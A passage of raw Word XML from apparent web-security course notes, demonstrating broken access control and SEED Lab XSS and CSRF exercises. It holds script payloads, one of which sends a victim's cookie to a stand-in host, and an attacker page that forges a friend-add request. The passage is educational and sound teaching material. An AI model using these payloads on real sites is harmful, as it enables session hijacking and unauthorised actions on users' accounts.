      <w:r w:rsidR="003F57B3">
        <w:t>areful programming must be done so that all the URLs are protected by access control</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> so that no matter how you get the URL, the permission </w:t>
      </w:r>
      <w:r w:rsidR="00184527">
        <w:t>should</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> be checked.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A9EDB1" w14:textId="77777777" w:rsidR="007230C5" w:rsidRDefault="003F57B3" w:rsidP="007230C5">
      <w:r>
        <w:t>Demo:</w:t>
      </w:r>
      <w:r w:rsidR="00224190">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D10862E" w14:textId="0BD15A17" w:rsidR="008728A3" w:rsidRDefault="003F57B3" w:rsidP="007A133E">
      <w:r>
        <w:t>Log in to the application</w:t>
      </w:r>
      <w:r w:rsidR="00D2295C">
        <w:t xml:space="preserve"> as admin</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, open </w:t>
      </w:r>
      <w:r w:rsidR="005703F9">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>network tab</w:t>
      </w:r>
      <w:r w:rsidR="00F06408">
        <w:t xml:space="preserve"> (press F12)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and perform a delete operation. Did you notice the </w:t>
      </w:r>
      <w:r w:rsidR="004C400D">
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that was invoked for the delete? Copy the </w:t>
      </w:r>
      <w:r w:rsidR="004C400D">
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t>. Log off. Now</w:t>
      </w:r>
      <w:r w:rsidR="004C400D">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> paste the </w:t>
      </w:r>
      <w:r w:rsidR="004C400D">
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the browser, change it a little</w:t>
      </w:r>
      <w:r w:rsidR="00D2295C">
        <w:t>. C</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">an </w:t>
      </w:r>
      <w:r w:rsidR="005703F9">
        <w:t>you</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> delete another record? But you are not logged in</w:t>
      </w:r>
      <w:r w:rsidR="004C61AC">
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:r w:rsidR="00D2295C">
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="004C61AC">
        <w:t>dmin</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00D2295C">
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> you shouldn</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>t have permission.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ACE08CF" w14:textId="77777777" w:rsidR="00F0386B" w:rsidRDefault="00F0386B">
      <w:pPr>
        <w:spacing w:before="160" w:after="320"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="0072C6" w:themeColor="accent1"/>
          <w:spacing w:val="14"/>
          <w:sz w:val="64"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA13489" w14:textId="55FF6F20" w:rsidR="00A133E4" w:rsidRDefault="00F0386B" w:rsidP="00A461C6">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:spacing w:after="360"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Seed</w:t>
      </w:r>
      <w:r w:rsidR="002B024C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Lab Demos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B5DF932" w14:textId="3DE56572" w:rsidR="00726BDE" w:rsidRDefault="00726BDE" w:rsidP="007A133E">
      <w:r>
        <w:t xml:space="preserve">In the </w:t>
      </w:r>
      <w:r w:rsidR="005A0F9B">
        <w:t>following</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> few </w:t>
      </w:r>
      <w:r w:rsidR="00956CE4">
        <w:t>demos,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> we will use </w:t>
      </w:r>
      <w:r w:rsidR="00D605B7">
        <w:t>the Seed</w:t>
      </w:r>
      <w:r w:rsidR="002B024C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D605B7">
        <w:t>Lab exercises located at:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF6B5EA" w14:textId="5B51C025" w:rsidR="00D605B7" w:rsidRDefault="007A3129" w:rsidP="007A133E">
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidR="00BE0ADF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://seedsecuritylabs.org/Labs_16.04/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="148FCD90" w14:textId="092E5F99" w:rsidR="00D605B7" w:rsidRDefault="00151BC8" w:rsidP="007A133E">
      <w:r>
        <w:t>There is a version 2 beta of these labs</w:t>
      </w:r>
      <w:r w:rsidR="00A1510C">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> but we will sti</w:t>
      </w:r>
      <w:r w:rsidR="00956CE4">
        <w:t>ck to this stable version.</w:t>
      </w:r>
      <w:r w:rsidR="00A1510C">
        <w:t xml:space="preserve"> These labs </w:t>
      </w:r>
      <w:r w:rsidR="009D6F31">
        <w:t xml:space="preserve">require </w:t>
      </w:r>
      <w:r w:rsidR="00237CFF">
        <w:t>Oracle virtual machine</w:t>
      </w:r>
      <w:r w:rsidR="00BB2D10">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00237CFF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00976F19">
        <w:t xml:space="preserve">and you </w:t>
      </w:r>
      <w:r w:rsidR="00173B13">
        <w:t>must</w:t>
      </w:r>
      <w:r w:rsidR="00976F19">
        <w:t xml:space="preserve"> import a pre-configured Ubuntu (Linux) virtual machine to do the labs. </w:t>
      </w:r>
      <w:r w:rsidR="00173B13">
        <w:t>Doing these labs on your own is not easy</w:t>
      </w:r>
      <w:r w:rsidR="004C7F4E">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00173B13">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004C7F4E">
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidR="00173B13">
        <w:t>e will do this together as a team.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF8553F" w14:textId="77777777" w:rsidR="00C11B23" w:rsidRDefault="00C11B23" w:rsidP="00C11B23">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-</w:t>
      </w:r>
      <w:r w:rsidR="00730184">
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidR="00987070">
        <w:t>ite Scripting</w:t>
      </w:r>
      <w:r w:rsidR="008F4828">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E91465">
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="008F4828">
        <w:t>XSS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AEB371D" w14:textId="6C4F710F" w:rsidR="00987070" w:rsidRDefault="00987070" w:rsidP="00987070">
      <w:r>
        <w:t xml:space="preserve">Cross-site scripting involves two things – first, scripting and </w:t>
      </w:r>
      <w:r w:rsidR="00507CEC">
        <w:t>then</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, crossing site. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CAE3CA8" w14:textId="21C07AB2" w:rsidR="00987070" w:rsidRDefault="00987070" w:rsidP="00987070">
      <w:r>
        <w:t xml:space="preserve">If a website allows users to input </w:t>
      </w:r>
      <w:r w:rsidR="001219AB">
        <w:t>any data,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a hacker can inject </w:t>
      </w:r>
      <w:r w:rsidR="006B0648">
        <w:t xml:space="preserve">some </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">JavaScript </w:t>
      </w:r>
      <w:r w:rsidR="006B0648">
        <w:t xml:space="preserve">code </w:t>
      </w:r>
      <w:r>
        <w:t>instead of data. For example, in the First Name field, the hacker inputs a JavaScript</w:t>
      </w:r>
      <w:r w:rsidR="00827F4F">
        <w:t xml:space="preserve"> code</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instead of his name. Now, </w:t>
      </w:r>
      <w:r w:rsidR="00A3174A">
        <w:t xml:space="preserve">in </w:t>
      </w:r>
      <w:r>
        <w:t>every place where the First Name is supposed to be displayed, the JavaScript is executed instead.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2359F33E" w14:textId="43805FCE" w:rsidR="00636AFB" w:rsidRDefault="00110E3B" w:rsidP="00987070">
      <w:r>
        <w:t>Let</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>s focus on crossing the site</w:t>
      </w:r>
      <w:r w:rsidR="00987070">
        <w:t xml:space="preserve">. The JavaScript injected could </w:t>
      </w:r>
      <w:r w:rsidR="00636AFB">
        <w:t>be</w:t>
      </w:r>
      <w:r w:rsidR="00987070">
        <w:t xml:space="preserve"> of such nature that it leaks sensitive information from the current site </w:t>
      </w:r>
      <w:r w:rsidR="00EB1C0C">
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r w:rsidR="00987070">
        <w:t>the hacker</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidR="00987070">
        <w:t xml:space="preserve">s site. That would be </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">an example of </w:t>
      </w:r>
      <w:r w:rsidR="00EB1C0C">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="00987070">
        <w:t>crossing site.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD54ED0" w14:textId="77777777" w:rsidR="00987070" w:rsidRDefault="001219AB" w:rsidP="00987070">
      <w:r>
        <w:t xml:space="preserve">Tip: </w:t>
      </w:r>
      <w:r w:rsidR="00636AFB">
        <w:t xml:space="preserve">Always scrub user input in such a way that no JavaScript is allowed. A technique called HTML Escaping can solve the problem. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3D71BB" w14:textId="2C95F52D" w:rsidR="007A133E" w:rsidRDefault="00036FCA" w:rsidP="007A133E">
      <w:r>
        <w:t>Demo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FEB8A47" w14:textId="5E7CB8B7" w:rsidR="004630A7" w:rsidRDefault="004630A7" w:rsidP="007A133E">
      <w:r>
        <w:t>For this lab, we will visit:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C728CF" w14:textId="636518AC" w:rsidR="004630A7" w:rsidRDefault="007A3129" w:rsidP="007A133E">
      <w:hyperlink r:id="rId9" w:history="1">
        <w:r w:rsidR="00E04DC1" w:rsidRPr="00315383">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://www.xsslabelgg.com/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0A4F77F4" w14:textId="6F19EB4F" w:rsidR="00756197" w:rsidRDefault="00756197" w:rsidP="007A133E">
      <w:r>
        <w:t>Log in as admin</w:t>
      </w:r>
      <w:r w:rsidR="00E011EB">
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0640E98E" w14:textId="47763630" w:rsidR="00036FCA" w:rsidRDefault="00B90EFD" w:rsidP="00B90EFD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>E</w:t>
      </w:r>
      <w:r w:rsidR="00717AFB">
        <w:t xml:space="preserve">nter the following </w:t>
      </w:r>
      <w:r w:rsidR="00C7562A">
        <w:t>snippet</w:t>
      </w:r>
      <w:r w:rsidR="00E47CAF">
        <w:t xml:space="preserve"> in the </w:t>
      </w:r>
      <w:r w:rsidR="00897150">
        <w:t>brief</w:t>
      </w:r>
      <w:r w:rsidR="00E47CAF">
        <w:t xml:space="preserve"> description field of any user</w:t>
      </w:r>
      <w:r w:rsidR="00C7562A">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034C9F2B" w14:textId="16250E24" w:rsidR="00717AFB" w:rsidRDefault="00F03E4A" w:rsidP="00B90EFD">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00F03E4A">
        <w:t>fun to hang out with &lt;script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F03E4A">
        <w:t>window.alert</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F03E4A">
        <w:t>("You are hacked!")&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="642DB817" w14:textId="5574AC36" w:rsidR="003237BA" w:rsidRDefault="003237BA" w:rsidP="00B90EFD">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now, </w:t>
      </w:r>
      <w:r w:rsidR="001A51BC">
        <w:t>all users viewing that profile</w:t>
      </w:r>
      <w:r w:rsidR="00784D7A">
        <w:t xml:space="preserve"> or listing that profile</w:t>
      </w:r>
      <w:r w:rsidR="001A51BC">
        <w:t xml:space="preserve"> wi</w:t>
      </w:r>
      <w:r w:rsidR="00784D7A">
        <w:t>ll</w:t>
      </w:r>
      <w:r w:rsidR="001A51BC">
        <w:t xml:space="preserve"> receive a JavaScript popup alert stating</w:t>
      </w:r>
      <w:r w:rsidR="00056534">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="001A51BC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="001A51BC">
        <w:t>You are hacked!</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F5A2F7" w14:textId="4F528D4A" w:rsidR="000F660D" w:rsidRDefault="00B90EFD" w:rsidP="00B90EFD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Enter the following </w:t>
      </w:r>
      <w:r w:rsidR="00756197">
        <w:t>snippet in the brief description field of any other user:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D031D83" w14:textId="41BBE943" w:rsidR="00756197" w:rsidRDefault="00131BA8" w:rsidP="00756197">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r w:rsidRPr="00131BA8">
        <w:t>college student. &lt;script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00131BA8">
        <w:t>window.alert</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00131BA8">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00131BA8">
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00131BA8">
        <w:t>)&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B886C46" w14:textId="1931BF96" w:rsidR="00784D7A" w:rsidRDefault="00784D7A" w:rsidP="00784D7A">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now, all users viewing that profile or listing that profile will receive a JavaScript popup alert </w:t>
      </w:r>
      <w:r w:rsidR="00C4683A">
        <w:t>with the c</w:t>
      </w:r>
      <w:r w:rsidR="003E7AAC">
        <w:t>urrent user's cookies</w:t>
      </w:r>
      <w:r w:rsidR="00C4683A">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60FC364D" w14:textId="77777777" w:rsidR="00C732D3" w:rsidRDefault="00C732D3" w:rsidP="00C732D3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Enter the following snippet in the brief description field of any other user:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0ABFBE" w14:textId="77777777" w:rsidR="006C75F3" w:rsidRDefault="006C75F3" w:rsidP="00F62B8E">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="006C75F3">
        <w:t xml:space="preserve">&lt;I&gt; a cool duke&lt;/I&gt;&lt;script&gt;var image = new </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006C75F3">
        <w:t>Image(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006C75F3">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006C75F3">
        <w:t>image.src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006C75F3">
        <w:t>="http://localhost?myCookie=" + escape(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006C75F3">
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006C75F3">
        <w:t>);&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D6D634" w14:textId="7306DF39" w:rsidR="00717AFB" w:rsidRDefault="00836951" w:rsidP="00F62B8E">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Please F12 and examine the network tab. You will see </w:t>
      </w:r>
      <w:r w:rsidR="00002B5E">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">cookie of the current </w:t>
      </w:r>
      <w:r w:rsidR="00AB7393">
        <w:t>user</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00002B5E">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> poste</w:t>
      </w:r>
      <w:r w:rsidR="00AB7393">
        <w:t>d t</w:t>
      </w:r>
      <w:r w:rsidR="000144FF">
        <w:t xml:space="preserve">o the </w:t>
      </w:r>
      <w:hyperlink r:id="rId10" w:history="1">
        <w:r w:rsidR="000144FF" w:rsidRPr="00315383">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://localhost</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="000144FF">
        <w:t xml:space="preserve"> site </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">– which could have been </w:t>
      </w:r>
      <w:r w:rsidR="000144FF">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00002B5E">
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>acker</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>s site instead.</w:t>
      </w:r>
      <w:r w:rsidR="00002B5E">
        <w:t xml:space="preserve"> This is one </w:t>
      </w:r>
      <w:r w:rsidR="00B60723">
        <w:t>way</w:t>
      </w:r>
      <w:r w:rsidR="00002B5E">
        <w:t xml:space="preserve"> to perform </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00002B5E">
        <w:t>session hijacking</w:t>
      </w:r>
      <w:r w:rsidR="00B60723">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00002B5E">
        <w:t xml:space="preserve"> where the hacker has your browser</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidR="00C66717">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00002B5E">
        <w:t xml:space="preserve"> session and can perform any action on the site</w:t>
      </w:r>
      <w:r w:rsidR="00C66717">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007B5A1C">
        <w:t>as if you are doing it</w:t>
      </w:r>
      <w:r w:rsidR="00002B5E">
        <w:t>. Scary!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E454CC" w14:textId="77777777" w:rsidR="00C831DE" w:rsidRDefault="00C831DE" w:rsidP="00C831DE">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-</w:t>
      </w:r>
      <w:r w:rsidR="00730184">
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>ite Request Forgery (CSRF)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6795C9A8" w14:textId="32A72E28" w:rsidR="0079467F" w:rsidRDefault="0079467F" w:rsidP="0079467F">
      <w:r>
        <w:t xml:space="preserve">The word </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:t>forgery</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is in there, isn</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">t it? So, this is </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="0036035B">
        <w:t>some kind of</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> forgery</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00FD16DD">
        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:r w:rsidR="00BB30CF">
        <w:t>type of attack</w:t>
      </w:r>
      <w:r w:rsidR="00FD16DD">
        <w:t xml:space="preserve"> tricks a user </w:t>
      </w:r>
      <w:r w:rsidR="00BB30CF">
        <w:t>into executing</w:t>
      </w:r>
      <w:r w:rsidR="00FD16DD">
        <w:t xml:space="preserve"> an unwanted operation on a web application that he/she is currently logged into.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32057183" w14:textId="0221CC21" w:rsidR="00216FE3" w:rsidRDefault="00216FE3" w:rsidP="0079467F">
      <w:r>
        <w:t>Demo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A0D0BF" w14:textId="134B901B" w:rsidR="00216FE3" w:rsidRDefault="00216FE3" w:rsidP="0079467F">
      <w:r>
        <w:t>In this lab</w:t>
      </w:r>
      <w:r w:rsidR="00460B2F">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0042184F">
        <w:t xml:space="preserve">we will </w:t>
      </w:r>
      <w:r w:rsidR="00ED42C7">
        <w:t>log</w:t>
      </w:r>
      <w:r w:rsidR="00460B2F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00ED42C7">
        <w:t xml:space="preserve">in as Alice using the following </w:t>
      </w:r>
      <w:r w:rsidR="00460B2F">
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidR="00ED42C7">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BED607" w14:textId="6B4F273D" w:rsidR="00ED42C7" w:rsidRDefault="007A3129" w:rsidP="0079467F">
      <w:hyperlink r:id="rId11" w:history="1">
        <w:r w:rsidR="00ED42C7" w:rsidRPr="00315383">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://www.csrflabelgg.com</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5A156684" w14:textId="0DFE153D" w:rsidR="00EA3B8B" w:rsidRDefault="00EA3B8B" w:rsidP="0079467F">
      <w:r>
        <w:t>Alice receives an email containing the following link:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B75019" w14:textId="77777777" w:rsidR="001C2278" w:rsidRDefault="007A3129" w:rsidP="001C2278">
      <w:hyperlink r:id="rId12" w:history="1">
        <w:r w:rsidR="001C2278" w:rsidRPr="00333D6A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://www.csrflabattacker.com/index.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6E98E464" w14:textId="01CC3AA8" w:rsidR="00EA3B8B" w:rsidRDefault="00354BCC" w:rsidP="00EA3B8B">
      <w:r>
        <w:t xml:space="preserve">The page </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>actually contains</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00731472">
        <w:t>the following:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A7EC237" w14:textId="77777777" w:rsidR="00EA3B8B" w:rsidRDefault="00EA3B8B" w:rsidP="00731472">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;!DOCTYPE html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BEDBBC7" w14:textId="77777777" w:rsidR="00EA3B8B" w:rsidRDefault="00EA3B8B" w:rsidP="00731472">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A49AE9E" w14:textId="77777777" w:rsidR="00EA3B8B" w:rsidRDefault="00EA3B8B" w:rsidP="00731472">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BC977A" w14:textId="77777777" w:rsidR="00EA3B8B" w:rsidRDefault="00EA3B8B" w:rsidP="00731472">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>&lt;title&gt;Hello Friend&lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390BE003" w14:textId="77777777" w:rsidR="00EA3B8B" w:rsidRDefault="00EA3B8B" w:rsidP="00731472">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;/head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="179DB1E0" w14:textId="77777777" w:rsidR="00EA3B8B" w:rsidRDefault="00EA3B8B" w:rsidP="00731472">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>&lt;body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BDAF9A" w14:textId="77777777" w:rsidR="00EA3B8B" w:rsidRDefault="00EA3B8B" w:rsidP="00731472">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This is a welcome page from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Boby's</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> site. Thank you for visiting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63065686" w14:textId="77777777" w:rsidR="00EA3B8B" w:rsidRDefault="00EA3B8B" w:rsidP="00731472">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> src="http://www.csrflabelgg.com/action/friends/add?friend=43"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053239A3" w14:textId="77777777" w:rsidR="00EA3B8B" w:rsidRDefault="00EA3B8B" w:rsidP="00731472">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
